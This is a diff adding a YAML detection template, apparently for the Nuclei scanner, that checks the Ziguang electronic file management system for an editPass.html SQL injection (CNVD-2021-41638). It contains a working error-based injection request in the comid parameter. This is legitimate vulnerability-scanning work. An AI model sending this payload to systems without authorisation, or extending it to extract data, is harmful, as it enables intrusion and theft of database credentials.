@@ -1,0 +1,27 @@
+id: cnvd-2021-41638
+info:
+  name: Ziguang File Management System editPass.html SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    There is a SQL injection vulnerability in the Ziguang electronic file management system, allowing attackers to obtain sensitive information such as database account passwords.
+  tags: sql-injection
+  classification:
+    cvss-score: 7.5
+  reference:
+    - https://github.com/zhaodie/r00t_wiki/blob/b680ded35f5e0a8541d91f220aa4f1a973376003/docs/wiki/webapp/%E7%B4%AB%E5%85%89%E8%BD%AF%E4%BB%B6/%E7%B4%AB%E5%85%89%E6%A1%A3%E6%A1%88%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20editPass.html%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-41638.md
+http:
+  - raw:
+      - |
+        GET /login/Login/editPass.html?comid=extractvalue(1,concat(char(126),md5(311))) HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "9dfcd5e558dfa04aaf37f137a1d9d3e"
+      - type: word
+        part: body
+        words:
+          - "XPATH syntax error"
